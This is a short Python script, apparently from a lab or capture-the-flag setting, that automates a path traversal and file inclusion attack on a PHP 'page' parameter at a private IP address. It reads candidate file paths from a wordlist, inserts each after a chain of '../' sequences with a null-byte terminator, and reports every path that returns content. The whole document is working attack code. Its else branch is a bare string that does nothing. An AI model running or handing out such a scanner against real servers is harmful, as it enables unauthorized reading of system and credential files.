import requests

url = "http://192.168.1.23/index.php?page=../../../../../..PARAM%00"

libFile = open("libraryGen.txt")

paths = libFile.readlines()

for path in paths:
    path = path.strip()
    request = requests.get(url.replace("PARAM", path))
    if request.content:
        print("find content with : ", path)
    else:
        "Failed to open stream"
libFile.close()


